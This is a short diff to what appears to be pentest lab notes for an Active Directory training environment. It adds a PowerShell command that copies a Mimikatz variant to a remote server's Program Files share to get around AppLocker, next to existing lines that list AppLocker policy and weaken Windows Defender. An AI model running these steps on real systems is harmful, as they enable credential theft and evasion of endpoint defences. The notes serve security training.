@@ -141,6 +141,11 @@ Get-AppLockerPolicy -Effective
 
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
+Upload Bypass AppLocker:
+```
+Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
 # Disable Windows Defender
 
 Set-MpPreference -PUAProtection 0
